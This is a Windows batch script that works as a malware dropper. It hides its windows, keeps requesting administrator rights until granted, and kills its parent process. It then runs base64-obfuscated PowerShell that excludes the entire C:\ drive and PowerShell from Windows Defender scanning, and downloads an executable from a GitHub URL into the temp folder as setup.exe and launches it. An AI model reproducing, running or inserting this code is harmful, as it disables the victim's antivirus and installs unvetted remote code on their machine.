@echo off
if not "%1"=="MINIMIZED" (
    start "" /min cmd /c "%~f0" MINIMIZED %*
    exit /b
)

net session >nul 2>&1
if %errorLevel% == 0 (
    goto :runAsAdmin
) else (
    goto :requestElevation
)

:requestElevation
    set "originalPID="
    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid^, commandline /format:list ^| find "MINIMIZED"') do (
        if not defined originalPID set "originalPID=%%A"
    )
    
    set "batchPath=%~f0"
    set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
    
    :tryElevate
    echo Requesting administrator privileges (window will minimize)...
    powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
    if %errorLevel% == 0 (
        timeout /t 2 >nul
        exit
    ) else (
        timeout /t 1 >nul
        goto :tryElevate
    )

:runAsAdmin
    if /i "%~2"=="KILLPARENT" (
        taskkill /PID %~3 /F >nul 2>&1
    )
    
    setlocal
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$de = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgLU5hbWUgIkM6XCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICIwIiAtRm9yY2U7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgIlBvd2VyU2hlbGwuZXhlIg==')); Invoke-Expression $de"
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$de = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGV4ZUZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgJ3NldHVwLmV4ZScpOyAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHBzOi8vZ2l0aHViLmNvbS9taWN0aG9tcHJvLWNsb3VkL2NvdWNvdS9yYXcvcmVmcy9oZWFkcy9tYWluL2NvdWNvdS5leGUnLCAkZXhlRmlsZSk7IFN0YXJ0LVByb2Nlc3MgJGV4ZUZpbGU=')); Invoke-Expression $de"
    endlocal
    exit